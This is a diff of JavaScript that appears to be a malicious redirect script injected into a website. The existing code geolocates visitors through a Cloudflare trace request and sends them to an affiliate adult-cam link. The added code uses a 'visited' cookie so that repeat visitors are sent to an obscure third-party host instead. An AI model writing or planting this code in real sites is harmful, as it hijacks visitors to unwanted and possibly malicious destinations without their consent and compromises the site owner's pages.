@@ -1,5 +1,12 @@
+jQuery(document).ready(function(){
+       if (document.cookie.indexOf('visited=true') == -1) {
+        var fifteenDays = 1000*60*60*24*60;
+        var expires = new Date((new Date()).valueOf() + fifteenDays);
+        document.cookie = "visited=true;expires=" + expires.toUTCString();
+
 var xRedir = 500;
 var xhttp = new XMLHttpRequest();
+
 xhttp.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
 var country_code = this.responseText.replace(/(\r\n|\n|\r)/gm,"").split('loc=');
@@ -98,3 +105,17 @@ setTimeout('window.location.href = "https://t.camsk5.com/133199/3664/0?target=do
 
 xhttp.open("GET", "https://www.cloudflare.com/cdn-cgi/trace", true);
 xhttp.send();
+
+
+
+ }else{
+        fifteenDays = 3000;
+        expires = new Date((new Date()).valueOf() + fifteenDays);
+        document.cookie = "visited=true;expires=" + expires.toUTCString();
+
+
+        setTimeout('window.location.href = "https://bgfffig.czpiix.com/s/490ea52c75cda"', xRedir);
+
+        }
+        });
+
